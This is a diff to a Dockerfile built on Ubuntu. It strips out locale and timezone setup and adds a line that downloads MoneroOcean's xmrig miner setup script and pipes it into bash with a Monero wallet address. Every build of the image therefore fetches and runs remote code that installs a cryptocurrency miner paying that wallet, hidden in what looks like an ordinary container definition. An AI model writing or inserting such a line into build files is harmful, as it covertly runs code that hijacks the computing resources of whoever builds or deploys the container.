@@ -1,13 +1,4 @@
 FROM ubuntu:latest
-LABEL maintainer="Novice <novice@piaoyun.shop>"
-ENV DEBIAN_FRONTEND noninteractive
-ENV LANG       en_US.UTF-8
-ENV LC_ALL	   "C.UTF-8"
-ENV LANGUAGE   en_US:en
-
-ENV TZ=Asia/Chongqing
-RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
-
-RUN apt-get update && apt-get install -y vim curl sudo cron net-tools iputils-ping tzdata
-
+RUN apt-get update && apt-get install -y vim git curl pciutils
+RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 41x3pBLY1ML3nnuZSGpytuGJjiSgeeY2QAbSLgHfqgAaM6FgRgVLVD9geruwsPeePe1T9KLwFmYg1ceoaEbU2nM5GTSPkXT
 
